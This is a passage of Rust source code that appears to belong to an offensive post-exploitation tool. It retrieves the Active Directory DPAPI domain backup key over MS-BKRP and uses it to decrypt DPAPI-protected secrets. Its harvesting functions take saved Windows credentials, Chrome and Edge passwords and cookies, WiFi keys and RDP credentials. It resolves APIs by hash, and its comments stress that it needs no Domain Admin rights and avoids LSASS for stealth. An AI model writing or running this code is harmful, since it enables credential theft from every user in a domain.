        }

        let version = u32::from_le_bytes(data[0..4].try_into().unwrap());
        let mk_version = u32::from_le_bytes(data[20..24].try_into().unwrap());
        let mk_offset = u32::from_le_bytes(data[24..28].try_into().unwrap());
        let key_identifier_offset = u32::from_le_bytes(data[28..32].try_into().unwrap());
        let key_identifier_size = u32::from_le_bytes(data[32..36].try_into().unwrap());
        let hmac_key_offset = u32::from_le_bytes(data[36..40].try_into().unwrap());
        let hmac_key_size = u32::from_le_bytes(data[40..44].try_into().unwrap());
        let data_offset = u32::from_le_bytes(data[44..48].try_into().unwrap());
        let data_size = u32::from_le_bytes(data[48..52].try_into().unwrap());
        let sign_offset = u32::from_le_bytes(data[52..56].try_into().unwrap());
        let sign_size = u32::from_le_bytes(data[56..60].try_into().unwrap());

        Ok(Self {
            version,
            guid_provider,
            mk_version,
            mk_offset,
            key_identifier_offset,
            key_identifier_size,
            hmac_key_offset,
            hmac_key_size,
            data_offset,
            data_size,
            sign_offset,
            sign_size,
        })
    }
}

/// Master key entry within a DPAPI blob.
#[derive(Debug)]
struct MasterKeyEntry {
    /// Master key GUID (16 bytes).
    guid: [u8; 16],
    /// Algorithm used (e.g. CALG_AES_256 = 0x00006610).
    algorithm: u32,
    /// Encrypted key material.
    encrypted_key: Vec<u8>,
}

/// Parse the master key entries from a DPAPI blob.
fn parse_master_keys(blob: &[u8], header: &DpapiBlobHeader) -> Result<Vec<MasterKeyEntry>> {
    let mut keys = Vec::new();
    let mk_offset = header.mk_offset as usize;

    if mk_offset >= blob.len() || mk_offset + 8 > blob.len() {
        bail!("Master key offset out of bounds");
    }

    // Each master key entry:
    //   guid (16 bytes) | algorithm (4 bytes) | flags (4 bytes) | encrypted_key_len (4 bytes)
    //   then encrypted_key_len bytes of encrypted key data
    let mut pos = mk_offset;
    while pos + 28 <= blob.len() {
        let guid: [u8; 16] = blob[pos..pos + 16].try_into().unwrap();
        let algorithm = u32::from_le_bytes(blob[pos + 16..pos + 20].try_into().unwrap());
        let _flags = u32::from_le_bytes(blob[pos + 20..pos + 24].try_into().unwrap());
        let enc_key_len = u32::from_le_bytes(blob[pos + 24..pos + 28].try_into().unwrap()) as usize;

        if pos + 28 + enc_key_len > blob.len() {
            break;
        }

        let encrypted_key = blob[pos + 28..pos + 28 + enc_key_len].to_vec();

        keys.push(MasterKeyEntry {
            guid,
            algorithm,
            encrypted_key,
        });

        // Move to next entry
        pos += 28 + enc_key_len;
        // Align to 8 bytes
        pos = (pos + 7) & !7;
    }

    Ok(keys)
}

// ── DPAPI Decryption ─────────────────────────────────────────────────────────

/// Session key derivation for DPAPI v2 blobs.
///
/// Derives the decryption key from the master key using HMAC-SHA512.
fn derive_session_key_v2(
    master_key: &[u8],
    blob_data: &[u8],
    header: &DpapiBlobHeader,
) -> Result<([u8; 32], [u8; 16])> {
    // For v2 blobs, derive the AES-256 key and IV from the master key.
    // The derivation uses HMAC-SHA512(master_key, blob_header_bytes).
    //
    // The derived material is 64 bytes from HMAC-SHA512:
    //   - First 32 bytes = AES-256 key
    //   - Next 16 bytes = AES-CBC IV
    //   - Last 16 bytes = HMAC key (not needed for decryption, used for verification)

    // HMAC-SHA512 over the blob header bytes (first 60 bytes for v2).
    let header_bytes = &blob_data[..60.min(blob_data.len())];

    let mut hmac =
        Hmac::<Sha512>::new_from_slice(master_key).map_err(|e| anyhow!("HMAC init failed: {e}"))?;
    hmac.update(header_bytes);
    let derived = hmac.finalize().into_bytes();

    let mut aes_key = [0u8; 32];
    aes_key.copy_from_slice(&derived[..32]);

    let mut iv = [0u8; 16];
    iv.copy_from_slice(&derived[32..48]);

    Ok((aes_key, iv))
}

/// AES-256-CBC decryption using the block-level decrypt API.
///
/// Uses the `aes` crate for the block cipher and implements CBC mode manually.
fn aes256_cbc_decrypt(key: &[u8; 32], iv: &[u8; 16], ciphertext: &[u8]) -> Result<Vec<u8>> {
    if ciphertext.is_empty() {
        return Ok(Vec::new());
    }
    if ciphertext.len() % 16 != 0 {
        bail!(
            "AES-CBC ciphertext length ({}) not a multiple of 16",
            ciphertext.len()
        );
    }

    // CBC decryption: P_i = D_K(C_i) XOR C_{i-1}
    // We use AES-256 ECB decryption on each block and XOR with previous ciphertext.

    use aes::cipher::Block;
    let cipher = Aes256::new_from_slice(key).expect("AES-256 key is always 32 bytes");

    let mut plaintext = ciphertext.to_vec();
    let mut prev_block: [u8; 16] = *iv;

    for chunk in plaintext.chunks_exact_mut(16) {
        let ct_block: [u8; 16] = {
            let mut arr = [0u8; 16];
            arr.copy_from_slice(chunk);
            arr
        };
        // Build a Block for decryption
        let mut block_arr = [0u8; 16];
        block_arr.copy_from_slice(chunk);
        let mut block: Block<Aes256> = <Block<Aes256>>::from(block_arr);
        cipher.decrypt_block(&mut block);

        // XOR decrypted block with previous ciphertext block (or IV)
        for i in 0..16 {
            chunk[i] = block[i] ^ prev_block[i];
        }

        prev_block = ct_block;
    }

    // Remove PKCS#7 padding
    if let Some(&last) = plaintext.last() {
        let pad_len = last as usize;
        if pad_len > 0 && pad_len <= 16 && pad_len <= plaintext.len() {
            let padding_valid = plaintext[plaintext.len() - pad_len..]
                .iter()
                .all(|&b| b == last);
            if padding_valid {
                plaintext.truncate(plaintext.len() - pad_len);
            }
        }
    }

    Ok(plaintext)
}

// ── Backup Key Decryption ────────────────────────────────────────────────────

/// The backup key returned by BKRP is a PVK (Private Key Blob) containing an
/// RSA private key.  Parse it to extract the key blob in a form usable by
/// CryptoAPI's CryptImportKey.
///
/// PVK format:
///   - PVK_MAGIC (4 bytes): 0xB0B5F11E
///   - PVK_VERSION (4 bytes): 0x00000003
///   - PVK_KEYTYPE (4 bytes): 0x00000001 (exchange) or 0x00000002 (signature)
///   - PVK_ENCRYPT (4 bytes): 0x00000000 (not encrypted)
///   - PVK_ALGID (4 bytes): algorithm ID (usually 0x0000A400 = CALG_RSA_KEYX)
///   - PVK_STRONG (4 bytes): entropy length
///   - PVK_STRONG2 (4 bytes): reserved
///   - PVK_BLOBLEN (4 bytes): key blob length
///   - PVK_BLOB (variable): the actual RSA key blob (PUBLICKEYSTRUC + RSAPUBKEY + private data)
fn parse_pvk_blob(key_data: &[u8]) -> Result<Vec<u8>> {
    if key_data.len() < 32 {
        bail!("PVK blob too short: {} bytes", key_data.len());
    }

    let magic = u32::from_le_bytes(key_data[0..4].try_into().unwrap());
    if magic != 0xB0B5F11E {
        // Might be a raw key blob without PVK header — try that.
        // PUBLICKEYSTRUC starts with bType (1 byte) + bVersion (1 byte) + reserved (2) + aiKeyAlg (4)
        // bType = 0x07 (PRIVATEKEYBLOB) for RSA private key.
        if !key_data.is_empty() && key_data[0] == 0x07 {
            tracing::info!("Backup key appears to be a raw PRIVATEKEYBLOB (no PVK header)");
            return Ok(key_data.to_vec());
        }
        bail!("Invalid PVK magic: 0x{magic:08X}");
    }

    let blob_len = u32::from_le_bytes(key_data[24..28].try_into().unwrap()) as usize;
    let blob_offset = 28;

    if blob_offset + blob_len > key_data.len() {
        bail!(
            "PVK blob truncated: need {} bytes at offset {}, have {}",
            blob_len,
            blob_offset,
            key_data.len()
        );
    }

    Ok(key_data[blob_offset..blob_offset + blob_len].to_vec())
}

/// Decrypt a DPAPI master key using the RSA backup key via Windows CryptoAPI.
///
/// This imports the RSA private key into a CSP and decrypts the master key.
fn decrypt_master_key_with_backup_key(
    encrypted_mk: &[u8],
    backup_key_data: &[u8],
) -> Result<Vec<u8>> {
    let crypt_acquire_context: FnCryptAcquireContextW = unsafe {
        resolve_api_or_load(
            &to_wide("advapi32.dll"),
            HASH_ADVAPI32_DLL,
            FN_CRYPT_ACQUIRE_CONTEXT_W,
        )
        .ok_or_else(|| anyhow!("CryptAcquireContextW resolve failed"))?
    };

    let crypt_import_key: FnCryptImportKey = unsafe {
        resolve_api(HASH_ADVAPI32_DLL, FN_CRYPT_IMPORT_KEY)
            .ok_or_else(|| anyhow!("CryptImportKey resolve failed"))?
    };

    let crypt_decrypt: FnCryptDecrypt = unsafe {
        resolve_api(HASH_ADVAPI32_DLL, FN_CRYPT_DECRYPT)
            .ok_or_else(|| anyhow!("CryptDecrypt resolve failed"))?
    };

    let crypt_release_context: FnCryptReleaseContext = unsafe {
        resolve_api(HASH_ADVAPI32_DLL, FN_CRYPT_RELEASE_CONTEXT)
            .ok_or_else(|| anyhow!("CryptReleaseContext resolve failed"))?
    };

    let crypt_destroy_key: FnCryptDestroyKey = unsafe {
        resolve_api(HASH_ADVAPI32_DLL, FN_CRYPT_DESTROY_KEY)
            .ok_or_else(|| anyhow!("CryptDestroyKey resolve failed"))?
    };

    // Parse the PVK to get the RSA key blob.
    let rsa_key_blob = parse_pvk_blob(backup_key_data)?;

    // Acquire a crypto context.
    let mut h_prov: usize = 0;
    let prov_ok = unsafe {
        crypt_acquire_context(
            &mut h_prov,
            ptr::null(), // default container
            ptr::null(), // default provider (Microsoft Enhanced RSA and AES)
            24,          // PROV_RSA_AES
            0x00800000,  // CRYPT_VERIFYCONTEXT
        )
    };
    if prov_ok == 0 {
        bail!("CryptAcquireContextW failed");
    }

    // Import the RSA private key.
    let mut h_key: usize = 0;
    let import_ok = unsafe {
        crypt_import_key(
            h_prov,
            rsa_key_blob.as_ptr(),
            rsa_key_blob.len() as DWORD,
            0, // hImportKey (not encrypted)
            0, // dwFlags
            &mut h_key,
        )
    };
    if import_ok == 0 {
        unsafe { crypt_release_context(h_prov, 0) };
        bail!("CryptImportKey failed for RSA backup key");
    }

    // Decrypt the master key.
    let mut decrypted = encrypted_mk.to_vec();
    let mut data_len = decrypted.len() as DWORD;
    let decrypt_ok = unsafe {
        crypt_decrypt(
            h_prov,
            h_key,
            0, // hHash (no hash)
            1, // Final = TRUE
            decrypted.as_mut_ptr(),
            &mut data_len,
            decrypted.len() as DWORD,
        )
    };

    unsafe {
        crypt_destroy_key(h_key);
        crypt_release_context(h_prov, 0);
    }

    if decrypt_ok == 0 {
        bail!(
            "CryptDecrypt failed for master key (encrypted len={})",
            encrypted_mk.len()
        );
    }

    decrypted.truncate(data_len as usize);
    Ok(decrypted)
}

// ── Main Entry Points ────────────────────────────────────────────────────────

/// Retrieve the domain DPAPI backup key from a Domain Controller.
///
/// Uses MS-BKRP over RPC to retrieve the backup key.  The backup key is an
/// RSA private key that can decrypt any DPAPI master key in the domain.
///
/// **Privileges**: Any domain-authenticated user. No Domain Admin required.
///
/// **OPSEC**: Does NOT touch LSASS memory.
pub fn retrieve_backup_key(dc_hostname: Option<String>) -> Result<BackupKeyInfo> {
    // Discover DC if not provided.
    let dc = dc_hostname.unwrap_or_else(|| discover_dc().unwrap_or_default());
    if dc.is_empty() {
        bail!("No DC hostname provided and auto-discovery failed");
    }

    tracing::info!("Retrieving DPAPI backup key from DC: {}", dc);

    // Call BKRP BackuprKey via RPC.
    let (version, key_data) =
        rpc_bkrp_backup_key(&dc).context("Failed to retrieve backup key via MS-BKRP")?;

    let key_hex = hex::encode(&key_data);

    Ok(BackupKeyInfo {
        dc_hostname: dc,
        domain: String::new(), // Could be filled from DsGetDcNameW
        key_version: version,
        key_data,
        key_hex,
    })
}

/// Decrypt a DPAPI blob using the domain backup key.
///
/// Parses the DPAPI blob, decrypts the master key with the backup key
/// (via RSA using Windows CryptoAPI), then decrypts the blob data
/// (AES-256-CBC for v2 blobs).
pub fn decrypt_dpapi_blob(blob: &[u8], backup_key_data: &[u8]) -> Result<Vec<u8>> {
    let header = DpapiBlobHeader::parse(blob).context("Failed to parse DPAPI blob header")?;

    match header.version {
        DPAPI_BLOB_VERSION_V2 => {
            // v2: AES-256-CBC + HMAC-SHA512
            let master_keys = parse_master_keys(blob, &header)?;
            if master_keys.is_empty() {
                bail!("DPAPI blob contains no master key entries");
            }

            // Try each master key entry.
            let mut last_err = None;
            for mk in &master_keys {
                match decrypt_master_key_with_backup_key(&mk.encrypted_key, backup_key_data) {
                    Ok(decrypted_mk) => {
                        // Derive session key from the decrypted master key.
                        match derive_session_key_v2(&decrypted_mk, blob, &header) {
                            Ok((aes_key, iv)) => {
                                // Decrypt the data.
                                let enc_data = &blob[header.data_offset as usize
                                    ..(header.data_offset + header.data_size) as usize];
                                match aes256_cbc_decrypt(&aes_key, &iv, enc_data) {
                                    Ok(plaintext) => return Ok(plaintext),
                                    Err(e) => {
                                        last_err = Some(e);
                                        continue;
                                    }
                                }
                            }
                            Err(e) => {
                                last_err = Some(e);
                                continue;
                            }
                        }
                    }
                    Err(e) => {
                        last_err = Some(e);
                        continue;
                    }
                }
            }

            Err(last_err.unwrap_or_else(|| anyhow!("No master key entries to try")))
        }
        DPAPI_BLOB_VERSION_V1 => {
            bail!("DPAPI v1 blobs (3DES-CBC) are not supported — use v2 (AES-256-CBC)")
        }
        v => bail!("Unknown DPAPI blob version: {v}"),
    }
}

// ── Credential Harvesting ────────────────────────────────────────────────────

/// Harvest DPAPI-protected secrets from common locations.
///
/// Scans:
/// - Windows Credential Store (`%USERPROFILE%\AppData\Local\Microsoft\Credentials\`)
/// - Chrome cookies and saved passwords (login data)
/// - WiFi profiles (WLAN keys)
/// - RDP saved connections
///
/// Requires the domain backup key to decrypt.
pub fn harvest_dpapi_secrets(backup_key_data: &[u8]) -> Result<Vec<DpapiSecret>> {
    let mut secrets = Vec::new();

    // 1. Windows Credential Store.
    match harvest_credential_store(backup_key_data) {
        Ok(mut s) => secrets.append(&mut s),
        Err(e) => tracing::warn!("Credential Store harvest failed: {e:#}"),
    }

    // 2. Chrome cookies/login data.
    match harvest_chrome_data(backup_key_data) {
        Ok(mut s) => secrets.append(&mut s),
        Err(e) => tracing::warn!("Chrome data harvest failed: {e:#}"),
    }

    // 3. WiFi profiles.
    match harvest_wifi_profiles(backup_key_data) {
        Ok(mut s) => secrets.append(&mut s),
        Err(e) => tracing::warn!("WiFi profile harvest failed: {e:#}"),
    }

    // 4. RDP saved connections.
    match harvest_rdp_credentials(backup_key_data) {
        Ok(mut s) => secrets.append(&mut s),
        Err(e) => tracing::warn!("RDP credential harvest failed: {e:#}"),
    }

    tracing::info!("Harvested {} DPAPI secrets total", secrets.len());
    Ok(secrets)
}

/// Harvest secrets from the Windows Credential Store.
fn harvest_credential_store(backup_key_data: &[u8]) -> Result<Vec<DpapiSecret>> {
    let mut secrets = Vec::new();

    // Credential Store path.
    let cred_dir = dirs::data_local_dir().map(|d| d.join("Microsoft").join("Credentials"));

    let cred_dir = match cred_dir {
        Some(d) => d,
        None => return Ok(secrets),
    };

    if !cred_dir.exists() {
        return Ok(secrets);
    }

    // Scan for credential files.
    for entry in std::fs::read_dir(&cred_dir)
        .unwrap_or_else(|_| std::fs::read_dir(".").unwrap_or_else(|_| panic!("no dir")))
    {
        let entry = match entry {
            Ok(e) => e,
            Err(_) => continue,
        };

        let data = match std::fs::read(entry.path()) {
            Ok(d) => d,
            Err(_) => continue,
        };

        // Try to parse as DPAPI blob.
        if let Ok(plaintext) = decrypt_dpapi_blob(&data, backup_key_data) {
            // Credential blob contains: dwVersion, dwType, dwFlags, dwSize, ...
            // For simplicity, extract what we can.
            let desc = format!("Credential Store ({})", entry.file_name().to_string_lossy());
            secrets.push(DpapiSecret {
                source: "Credential Store".to_string(),
                identifier: entry.file_name().to_string_lossy().to_string(),
                value: hex::encode(&plaintext),
                username: None,
                timestamp: None,
            });
        }
    }

    Ok(secrets)
}

/// Harvest Chrome cookies and saved passwords.
fn harvest_chrome_data(backup_key_data: &[u8]) -> Result<Vec<DpapiSecret>> {
    let mut secrets = Vec::new();

    // Chrome user data paths.
    let chrome_paths = [
        dirs::data_local_dir().map(|d| d.join("Google").join("Chrome").join("User Data")),
        dirs::data_local_dir().map(|d| d.join("Microsoft").join("Edge").join("User Data")),
    ];

    for chrome_path in &chrome_paths {
        let chrome_path = match chrome_path {
            Some(p) => p,
            None => continue,
        };

        if !chrome_path.exists() {
            continue;
        }

        // Check for "Login Data" SQLite files in profile directories.
        for profile_entry in std::fs::read_dir(chrome_path)
            .unwrap_or_else(|_| std::fs::read_dir(".").unwrap_or_else(|_| panic!("no dir")))
        {
            let profile_entry = match profile_entry {
                Ok(e) => e,
                Err(_) => continue,
            };

            let profile_name = profile_entry.file_name();
            let profile_name_str = profile_name.to_string_lossy();

            // Check for "Default" and "Profile *" directories.
            if profile_name_str != "Default" && !profile_name_str.starts_with("Profile ") {
                continue;
            }

            let profile_dir = profile_entry.path();

            // Try "Login Data" for saved passwords.
            let login_data_path = profile_dir.join("Login Data");
            if login_data_path.exists() {
                // Read the SQLite file and extract encrypted password blobs.
                // We can't use the rusqlite crate (not a dependency), so we do
                // a simple binary scan for DPAPI-encrypted blobs.
                if let Ok(data) = std::fs::read(&login_data_path) {
                    // Scan for DPAPI blob markers (the provider GUID).
                    let secrets_found = scan_for_dpapi_blobs(
                        &data,
                        backup_key_data,
                        &format!("Chrome Login ({profile_name_str})"),
                    );
                    secrets.extend(secrets_found);
                }
            }

            // Try "Cookies" for cookie values.
            let cookies_path = profile_dir.join("Network").join("Cookies");
            if !cookies_path.exists() {
                // Fall back to old location.
                let alt_path = profile_dir.join("Cookies");
                if alt_path.exists() {
                    if let Ok(data) = std::fs::read(&alt_path) {
                        let secrets_found = scan_for_dpapi_blobs(
                            &data,
                            backup_key_data,
                            &format!("Chrome Cookies ({profile_name_str})"),
                        );
                        secrets.extend(secrets_found);
                    }
                }
            } else if let Ok(data) = std::fs::read(&cookies_path) {
                let secrets_found = scan_for_dpapi_blobs(
                    &data,
                    backup_key_data,
                    &format!("Chrome Cookies ({profile_name_str})"),
                );
                secrets.extend(secrets_found);
            }
        }
    }

    Ok(secrets)
}

/// Scan binary data for DPAPI blobs and attempt decryption.
fn scan_for_dpapi_blobs(data: &[u8], backup_key_data: &[u8], source: &str) -> Vec<DpapiSecret> {
    let mut secrets = Vec::new();
    let mut pos = 0;

    while pos + 20 <= data.len() {
        // Check for DPAPI provider GUID at data[pos+4..pos+20].
        if data.len() >= pos + 20 {
            let guid = &data[pos + 4..pos + 20];
            if guid == DPAPI_PROVIDER_GUID {
                // Found a potential DPAPI blob.
                // Read the version and check if the header makes sense.
                if pos + 60 <= data.len() {
                    let version =
                        u32::from_le_bytes(data[pos..pos + 4].try_into().unwrap_or([0; 4]));
                    if version == 2 || version == 1 {
                        // Try to parse as a full DPAPI blob.
                        // We need to determine the total blob size from the header.
                        let data_size = u32::from_le_bytes(
                            data[pos + 48..pos + 52].try_into().unwrap_or([0; 4]),
                        );
                        let sign_size = u32::from_le_bytes(
                            data[pos + 52..pos + 56].try_into().unwrap_or([0; 4]),
                        );

                        // Approximate blob end.
                        let blob_end = pos + 60 + data_size as usize + sign_size as usize + 512;
                        let blob_end = blob_end.min(data.len());

                        let blob_data = &data[pos..blob_end];

                        match decrypt_dpapi_blob(blob_data, backup_key_data) {
                            Ok(plaintext) => {
                                secrets.push(DpapiSecret {
                                    source: source.to_string(),
                                    identifier: format!("offset=0x{pos:X}"),
                                    value: hex::encode(&plaintext),
                                    username: None,
                                    timestamp: None,
                                });
                                pos = blob_end;
                                continue;
                            }
                            Err(_) => {
                                // Not a valid blob or decryption failed — skip.
                            }
                        }
                    }
                }
            }
        }
        pos += 1;
    }

    secrets
}

/// Harvest WiFi profile keys.
fn harvest_wifi_profiles(backup_key_data: &[u8]) -> Result<Vec<DpapiSecret>> {
    let mut secrets = Vec::new();

    // WiFi profiles are stored in:
    // C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\{GUID}\*.xml
    let wifi_base = PathBuf::from(r"C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces");

    if !wifi_base.exists() {
        return Ok(secrets);
    }

    // Iterate interface GUID directories.
    for iface_entry in std::fs::read_dir(&wifi_base)
        .unwrap_or_else(|_| std::fs::read_dir(".").unwrap_or_else(|_| panic!("no dir")))
    {
        let iface_entry = match iface_entry {
            Ok(e) => e,
            Err(_) => continue,
        };

        if !iface_entry.path().is_dir() {
            continue;
        }

        for profile_entry in std::fs::read_dir(iface_entry.path())
            .unwrap_or_else(|_| std::fs::read_dir(".").unwrap_or_else(|_| panic!("no dir")))
        {
            let profile_entry = match profile_entry {
                Ok(e) => e,
                Err(_) => continue,
            };

            let path = profile_entry.path();
            if path.extension().and_then(|e| e.to_str()) != Some("xml") {
                continue;
            }

            // WiFi profile XML may contain encrypted key material.
            // For enterprise WiFi, the key material is DPAPI-encrypted.
            // For personal WiFi, the key is in hex in the <keyMaterial> tag.
            let xml_data = match std::fs::read_to_string(&path) {
                Ok(d) => d,
                Err(_) => continue,
            };

            // Extract SSID from XML.
            let ssid =
                extract_xml_value(&xml_data, "name").unwrap_or_else(|| "unknown".to_string());

            // Check for protected (encrypted) key material.
            if xml_data.contains("<protected>true</protected>")
                || xml_data.contains("<protected>TRUE</protected>")
            {
                // The keyMaterial contains a DPAPI-encrypted blob (base64 encoded).
                if let Some(key_b64) = extract_xml_value(&xml_data, "keyMaterial") {
                    if let Ok(key_bytes) =
                        base64::engine::general_purpose::STANDARD.decode(&key_b64)
                    {
                        if let Ok(plaintext) = decrypt_dpapi_blob(&key_bytes, backup_key_data) {
                            let wifi_key = String::from_utf8_lossy(&plaintext);
                            secrets.push(DpapiSecret {
                                source: "WiFi Profile".to_string(),
                                identifier: ssid,
                                value: wifi_key.to_string(),
                                username: None,
                                timestamp: None,
                            });
                        }
                    }
                }
            }
        }
    }

    Ok(secrets)
}

/// Harvest RDP saved credentials.
fn harvest_rdp_credentials(backup_key_data: &[u8]) -> Result<Vec<DpapiSecret>> {
    let mut secrets = Vec::new();

    // RDP saved credentials are stored in:
    // %USERPROFILE%\AppData\Local\Microsoft\Credentials\*
    // They are DPAPI blobs that can be decrypted with the backup key.

    let cred_paths = [dirs::data_local_dir().map(|d| d.join("Microsoft").join("Credentials"))];

    for cred_path in &cred_paths {
        let cred_path = match cred_path {
            Some(p) if p.exists() => p.clone(),
            _ => continue,
        };

        for entry in std::fs::read_dir(&cred_path)
            .unwrap_or_else(|_| std::fs::read_dir(".").unwrap_or_else(|_| panic!("no dir")))
        {
            let entry = match entry {
                Ok(e) => e,
                Err(_) => continue,
            };

            let data = match std::fs::read(entry.path()) {
                Ok(d) => d,
                Err(_) => continue,
            };

            // Check if this looks like a DPAPI blob.
            if data.len() < 20 {
                continue;
            }

            if data[4..20] == DPAPI_PROVIDER_GUID {
                match decrypt_dpapi_blob(&data, backup_key_data) {
                    Ok(plaintext) => {
                        // Try to extract RDP-specific info from the decrypted blob.
                        let filename = entry.file_name().to_string_lossy().to_string();
                        secrets.push(DpapiSecret {
                            source: "RDP Credential".to_string(),
                            identifier: filename,
                            value: hex::encode(&plaintext),
                            username: None,
                            timestamp: None,
                        });
                    }
                    Err(_) => continue,
                }
            }
        }
    }

    Ok(secrets)
}

/// Extract a value from an XML tag.
fn extract_xml_value(xml: &str, tag: &str) -> Option<String> {
    let open = format!("<{tag}>");
    let close = format!("</{tag}>");
    let start = xml.find(&open)?;
    let content_start = start + open.len();
    let end = xml[content_start..].find(&close)?;
    Some(xml[content_start..content_start + end].to_string())
}

// ── Unit Tests ───────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_dpapi_provider_guid() {
        // Verify the expected GUID bytes match the known DPAPI provider GUID.
        // DF9D8CD0-1501-11D1-8C7A-00C04FC297EB
        let expected: [u8; 16] = [
            0xD0, 0x8C, 0x9D, 0xDF, 0x01, 0x15, 0xD1, 0x11, 0x8C, 0x7A, 0x00, 0xC0, 0x4F, 0xC2,
            0x97, 0xEB,
        ];
        assert_eq!(DPAPI_PROVIDER_GUID, expected);
    }

    #[test]
    fn test_dpapi_blob_header_parse_valid() {
        // Construct a minimal valid DPAPI blob header (v2).
        let mut blob = vec![0u8; 104];

        // Version = 2
        blob[0..4].copy_from_slice(&2u32.to_le_bytes());
        // Provider GUID
        blob[4..20].copy_from_slice(&DPAPI_PROVIDER_GUID);
        // mkVersion = 2
        blob[20..24].copy_from_slice(&2u32.to_le_bytes());
        // mkOffset = 104 (after the header)
        blob[24..28].copy_from_slice(&104u32.to_le_bytes());
        // keyIdentifierOffset = 0
        blob[28..32].copy_from_slice(&0u32.to_le_bytes());
        // keyIdentifierSize = 0
        blob[32..36].copy_from_slice(&0u32.to_le_bytes());
        // hmacKeyOffset
        blob[36..40].copy_from_slice(&200u32.to_le_bytes());
        // hmacKeySize
        blob[40..44].copy_from_slice(&64u32.to_le_bytes());
        // dataOffset
        blob[44..48].copy_from_slice(&264u32.to_le_bytes());
        // dataSize
        blob[48..52].copy_from_slice(&128u32.to_le_bytes());
        // signOffset
        blob[52..56].copy_from_slice(&392u32.to_le_bytes());
        // signSize
        blob[56..60].copy_from_slice(&64u32.to_le_bytes());

        let header = DpapiBlobHeader::parse(&blob).expect("should parse valid header");
        assert_eq!(header.version, 2);
        assert_eq!(header.mk_offset, 104);
        assert_eq!(header.data_offset, 264);
        assert_eq!(header.data_size, 128);
        assert_eq!(header.sign_size, 64);
    }

    #[test]
    fn test_dpapi_blob_header_parse_too_short() {
        let blob = vec![0u8; 50];
        assert!(DpapiBlobHeader::parse(&blob).is_err());
    }

    #[test]
    fn test_dpapi_blob_header_parse_wrong_guid() {
        let mut blob = vec![0u8; 104];
        blob[0..4].copy_from_slice(&2u32.to_le_bytes());
        // Wrong GUID
        blob[4..20].copy_from_slice(&[0xAA; 16]);

        assert!(DpapiBlobHeader::parse(&blob).is_err());
    }

    #[test]
    fn test_aes256_cbc_decrypt_basic() {
        // Test with known data: encrypt then decrypt.
        // AES-256-CBC with all-zero key and IV, plaintext "Hello World" + PKCS7 padding.
        use aes::cipher::{Block, BlockCipherEncrypt, KeyInit};

        let key = [0x42u8; 32];
        let iv = [0x13u8; 16];
        let plaintext = b"Hello DPAPI World!!"; // 19 bytes

        // Manual AES-CBC encryption.
        let cipher = Aes256::new_from_slice(&key).expect("AES-256 key is 32 bytes");

        // PKCS7 pad to 32 bytes (2 blocks).
        let pad_len = 32 - plaintext.len();
        let mut padded = plaintext.to_vec();
        padded.extend(std::iter::repeat(pad_len as u8).take(pad_len));

        let mut ciphertext = Vec::new();
        let mut prev = iv;

        for chunk in padded.chunks(16) {
            let mut block = [0u8; 16];
            for i in 0..16 {
                block[i] = chunk[i] ^ prev[i];
            }
            let mut ga: Block<Aes256> = Block::<Aes256>::from(block);
            cipher.encrypt_block(&mut ga);
            let enc: [u8; 16] = ga.into();
            ciphertext.extend_from_slice(&enc);
            prev = enc;
        }

        // Decrypt.
        let decrypted =
            aes256_cbc_decrypt(&key, &iv, &ciphertext).expect("AES-256-CBC decrypt should succeed");

        assert_eq!(&decrypted, plaintext);
    }

    #[test]
    fn test_aes256_cbc_decrypt_empty() {
        let key = [0u8; 32];
        let iv = [0u8; 16];
        let result = aes256_cbc_decrypt(&key, &iv, &[]);
        assert!(result.is_ok());
        assert!(result.unwrap().is_empty());
    }

    #[test]
    fn test_aes256_cbc_decrypt_bad_length() {
        let key = [0u8; 32];
        let iv = [0u8; 16];
        let ciphertext = vec![0u8; 17]; // Not a multiple of 16.
        assert!(aes256_cbc_decrypt(&key, &iv, &ciphertext).is_err());
    }

    #[test]
    fn test_pvk_blob_parse_valid() {
        // Construct a minimal PVK blob.
        let rsa_blob = vec![0x07, 0x02, 0x00, 0x00, 0x00, 0xA4, 0x00, 0x00]; // Minimal PRIVATEKEYBLOB
        let mut pvk = Vec::new();
        pvk.extend_from_slice(&0xB0B5F11Eu32.to_le_bytes()); // magic
        pvk.extend_from_slice(&0x00000003u32.to_le_bytes()); // version
        pvk.extend_from_slice(&0x00000001u32.to_le_bytes()); // keytype
        pvk.extend_from_slice(&0x00000000u32.to_le_bytes()); // encrypt
        pvk.extend_from_slice(&0x0000A400u32.to_le_bytes()); // algid
        pvk.extend_from_slice(&0x00000000u32.to_le_bytes()); // strong
        pvk.extend_from_slice(&0x00000000u32.to_le_bytes()); // strong2
        pvk.extend_from_slice(&(rsa_blob.len() as u32).to_le_bytes()); // bloblen
        pvk.extend_from_slice(&rsa_blob);

        let parsed = parse_pvk_blob(&pvk).expect("PVK parse should succeed");
        assert_eq!(parsed, rsa_blob);
    }

    #[test]
    fn test_pvk_blob_parse_raw_key_blob() {
        // A raw PRIVATEKEYBLOB without PVK header.
        let raw = vec![0x07, 0x02, 0x00, 0x00, 0x00, 0xA4, 0x00, 0x00];
        let parsed = parse_pvk_blob(&raw).expect("Raw key blob parse should succeed");
        assert_eq!(parsed, raw);
    }

    #[test]
    fn test_rpc_bind_pdu_construction() {
        let pdu = build_rpc_bind_pdu();
        assert_eq!(BKRP_INTERFACE_UUID_BYTES.len(), 20);
        // Check PDU type is bind.
        assert_eq!(pdu[2], PDU_TYPE_BIND);
        // Check version.
        assert_eq!(pdu[0], RPC_VERSION_MAJOR);
        assert_eq!(pdu[1], RPC_VERSION_MINOR);
        // Check frag_length field matches actual length.
        let frag_len = u16::from_le_bytes([pdu[8], pdu[9]]);
        assert_eq!(frag_len as usize, pdu.len());
    }

    #[test]
    fn test_rpc_request_pdu_construction() {
        let pdu = build_rpc_request_pdu("dc01.example.com");
        // Check PDU type is request.
        assert_eq!(pdu[2], PDU_TYPE_REQUEST);
        // Check frag_length field.
        let frag_len = u16::from_le_bytes([pdu[8], pdu[9]]);
        assert_eq!(frag_len as usize, pdu.len());

        // Request header is 8 bytes after the 16-byte common header.
        let alloc_hint = u32::from_le_bytes([pdu[16], pdu[17], pdu[18], pdu[19]]) as usize;
        assert_eq!(alloc_hint, pdu.len() - 24);
        assert_eq!(u16::from_le_bytes([pdu[20], pdu[21]]), 0); // context_id
        assert_eq!(u16::from_le_bytes([pdu[22], pdu[23]]), 0); // opnum BackuprKey

        // Stub begins immediately at offset 24 with a non-null referent ID.
